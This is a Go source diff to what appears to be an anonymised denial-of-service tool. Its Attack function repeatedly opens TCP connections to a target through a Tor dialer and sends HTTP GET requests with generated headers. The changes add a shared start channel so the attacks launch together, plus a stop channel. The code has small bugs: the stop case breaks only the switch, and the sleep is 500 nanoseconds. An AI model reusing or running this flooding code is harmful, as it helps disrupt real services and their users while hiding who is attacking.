@@ -15,7 +15,9 @@ import (
 )
 
 func NewClient() (*Client, error) {
-	c := &Client{}
+	c := &Client{
+		Stop: make(chan bool),
+	}
 	if err := c.startup(); err != nil {
 		return nil, err
 	}
@@ -27,6 +29,7 @@ type Client struct {
 	HTTP       *http.Client
 	Dialer     *tor.Dialer
 	Running 	bool
+	Stop 	    chan bool
 	dialCancel context.CancelFunc
 }
 
@@ -59,7 +62,9 @@ func (c *Client) startup() error {
 	return nil
 }
 
-func (c *Client) Attack(target string) {
+func (c *Client) Attack(start *chan struct{}, target string) {
+
+	<-*start
 
 	var conn net.Conn
 
@@ -68,29 +73,30 @@ func (c *Client) Attack(target string) {
 			conn.Close()
 		}
 
-		// switch {
-		// case c.Running == false:
-		// 	break
-		// }
-
-		conn, err := c.Dialer.Dial("tcp", target)
-		if err != nil {
-			logging.Error(err.Error())
-			continue
+		switch {
+		case <-c.Stop:
+			break
+		default:
+			conn, err := c.Dialer.Dial("tcp", target)
+			if err != nil {
+				logging.Error(err.Error())
+				continue
+			}
+	
+			if _, err = fmt.Fprintf(conn, "%s %s HTTP/1.1\r\n", "GET", "/"); err != nil {
+				logging.Error(err.Error())
+				continue
+			}
+	
+			header := createHeader(target)
+			if err = header.Write(conn); err != nil {
+				logging.Error(err.Error())
+				continue
+			}
+	
+			time.Sleep(500)
 		}
 
-		if _, err = fmt.Fprintf(conn, "%s %s HTTP/1.1\r\n", "GET", "/"); err != nil {
-			logging.Error(err.Error())
-			continue
-		}
-
-		header := createHeader(target)
-		if err = header.Write(conn); err != nil {
-			logging.Error(err.Error())
-			continue
-		}
-
-		time.Sleep(500)
 	}
 }
 
